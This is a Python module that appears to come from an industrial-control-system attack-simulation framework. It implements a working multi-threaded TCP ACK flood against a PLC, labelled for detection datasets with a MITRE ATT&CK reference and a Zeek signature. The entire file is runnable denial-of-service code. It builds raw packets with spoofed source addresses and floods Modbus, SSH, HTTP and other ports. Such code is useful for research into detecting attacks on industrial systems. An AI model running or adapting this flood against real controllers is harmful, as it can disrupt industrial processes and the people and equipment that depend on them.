"""
Attack #4: TCP ACK Flood (Denial of Service)
==================================================================
Sends invalid ACK packets, keeping the PLC's TCP stack busy.
Effect: packet loss and retransmission on existing Modbus connections.

Packet rate targets:
  - ~1,500-3,000 pkt/s (3 threads x 500-1000 pkt/s)

MITRE ATT&CK for ICS: T0814 - Denial of Service
Zeek signature: conn.log -> state=RSTO or RSTR (RST response), proto=tcp
"""

import time
import sys
import os
import socket
import struct
import random
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from network_attacks.net_config import (
    PLC_IP, MODBUS_PORT, DEFAULT_NET_DURATION,
    LABEL_TCP_ACK_FLOOD, NET_DURATIONS
)

ATTACK_NAME = "TCP_ACK_Flood"
ATTACK_ID   = LABEL_TCP_ACK_FLOOD

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
THREAD_COUNT = 3
PKT_PER_SEC  = 500      # Per thread
THREAD_SLEEP = 1.0 / PKT_PER_SEC

TARGET_PORTS = [502, 1880, 80, 443, 22, 23, 8086, 3000]


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = sum((data[i] << 8) + data[i+1] for i in range(0, len(data), 2))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _build_ack_packet(src_ip: str, dst_ip: str, dst_port: int) -> bytes:
    """Invalid ACK packet - random seq/ack triggers an RST response."""
    src_port = random.randint(1024, 65535)
    seq      = random.randint(0, 2**32 - 1)
    ack_seq  = random.randint(0, 2**32 - 1)
    offset   = (5 << 4)
    flags    = 0x010   # ACK
    window   = random.choice([0, 1024, 4096, 8192])  # Zero window: forces an RST

    src_b = socket.inet_aton(src_ip)
    dst_b = socket.inet_aton(dst_ip)
    pseudo  = struct.pack('!4s4sBBH', src_b, dst_b, 0, socket.IPPROTO_TCP, 20)
    tcp_hdr = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq,
                          offset, flags, window, 0, 0)
    chk     = _checksum(pseudo + tcp_hdr)
    tcp_hdr = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq,
                          offset, flags, window, chk, 0)
    ip_hdr  = struct.pack('!BBHHHBBH4s4s',
        (4 << 4) | 5, 0, 40, random.randint(1, 65535), 0,
        64, socket.IPPROTO_TCP, 0, src_b, dst_b)
    return ip_hdr + tcp_hdr


def _ack_flood_worker(target_ip: str, duration_sec: float,
                      counter: list, stop_event: threading.Event):
    """ACK flood thread worker."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        use_raw = True
    except PermissionError:
        use_raw = False
        sock = None

    start = time.time()

    while not stop_event.is_set() and (time.time() - start) < duration_sec:
        port = random.choice(TARGET_PORTS)
        try:
            if use_raw:
                src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                pkt = _build_ack_packet(src_ip, target_ip, port)
                sock.sendto(pkt, (target_ip, 0))
                counter[0] += 1
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.01)
                try:
                    s.connect((target_ip, port))
                except Exception:
                    pass
                finally:
                    try:
                        s.close()
                    except Exception:
                        pass
                counter[0] += 1
        except Exception:
            pass

        time.sleep(THREAD_SLEEP)

    if sock:
        try:
            sock.close()
        except Exception:
            pass


def run_attack(duration_sec=None, label_manager=None, target_ip=None):
    """Multi-threaded TCP ACK flood."""
    if duration_sec is None:
        duration_sec = NET_DURATIONS.get("tcp_ack_flood", DEFAULT_NET_DURATION)
    if target_ip is None:
        target_ip = PLC_IP

    est_pps = THREAD_COUNT * PKT_PER_SEC

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target   : {target_ip}")
    print(f"  Method   : Invalid ACK -> forces an RST response")
    print(f"  Threads  : {THREAD_COUNT} x {PKT_PER_SEC} pkt/s = ~{est_pps} pkt/s")
    print(f"  Duration : {duration_sec}s")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"ACK flood -> {target_ip}, ~{est_pps} pkt/s, invalid seq/ack triggering RST"
        )

    counter    = [0]
    stop_event = threading.Event()
    threads    = []

    for _ in range(THREAD_COUNT):
        t = threading.Thread(
            target=_ack_flood_worker,
            args=(target_ip, duration_sec, counter, stop_event),
            daemon=True
        )
        t.start()
        threads.append(t)

    start_time = time.time()
    try:
        while (time.time() - start_time) < duration_sec:
            elapsed = time.time() - start_time
            rem     = duration_sec - elapsed
            pps     = counter[0] / max(elapsed, 0.1)
            print(f"  [ACK]  {counter[0]:,} pkt | {pps:.0f} pkt/s | remaining: {rem:.0f}s")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n  [ACK] Manual stop!")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=3)
        elapsed = time.time() - start_time
        pps     = counter[0] / max(elapsed, 0.1)
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{counter[0]:,} packets, {elapsed:.1f}s, {pps:.0f} pkt/s"
            )
        print(f"\n  [ACK] {counter[0]:,} packets | {pps:.0f} pkt/s | {elapsed:.1f}s")
    return True


if __name__ == "__main__":
    run_attack(duration_sec=30)
